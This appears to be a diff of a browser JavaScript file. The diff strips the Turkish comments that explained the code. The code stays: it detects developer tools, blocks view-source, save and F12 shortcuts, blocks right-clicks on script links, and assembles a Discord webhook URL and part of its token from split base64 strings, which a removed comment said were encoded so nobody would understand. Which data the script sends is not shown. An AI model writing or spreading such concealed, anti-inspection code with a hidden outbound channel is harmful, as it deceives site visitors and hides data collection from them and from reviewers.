@@ -1,7 +1,7 @@
 (function (global) {
     "use strict";
 
-    // Dosya indirilmeyi engelleme
+    
     if (typeof document !== "undefined") {
         // Developer tools açılırsa uyarı
         var _start = Date.now();
@@ -14,7 +14,7 @@
             }
         });
 
-        // Dosyayı indirmeye çalışanları engelle
+        
         document.addEventListener('contextmenu', function(e) {
             if (e.target.closest('a[href*=".js"]')) {
                 e.preventDefault();
@@ -22,7 +22,7 @@
             }
         });
 
-        // Keyboard shortcuts engelle (Ctrl+S, Ctrl+U, F12)
+        
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || 
                 (e.ctrlKey && e.key === 's') || 
@@ -38,7 +38,7 @@
     var EMBED_COLOR = 0xfdb913;
     var AVATAR_URL = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f7e1.png";
 
-    // YENİ WEBHOOK - base64 encoded (kimse anlamasın diye)
+    
     var _0x3f2e = (function() {
         var _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
         var _p2 = "MTQ5MTAwMTk2NTM2NTQyODI5NC9mU0F2S2J1NmZPaXhyLVd0";
